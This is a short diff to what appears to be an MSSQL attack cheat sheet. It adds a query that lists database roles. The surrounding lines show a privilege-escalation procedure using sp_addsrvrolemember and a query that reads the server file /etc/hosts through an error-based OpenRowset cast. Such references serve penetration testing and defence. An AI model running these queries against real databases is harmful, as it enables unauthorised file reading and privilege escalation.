@@ -156,7 +156,10 @@ CREATE PROCEDURE IMDATELOHJOSUUSOOJAHMSAT WITH EXECUTE AS OWNER AS EXEC sp_addsr
 ```
 
 ## Useful Queries
-
+### List all roles
+```
+Select [name] From sysusers Where issqlrole = 1
+```
 ### Read localfile through errors
 ```
 Select cast((select x from OpenRowset(BULK '/etc/hosts',SINGLE_CLOB) R(x)) as int) 
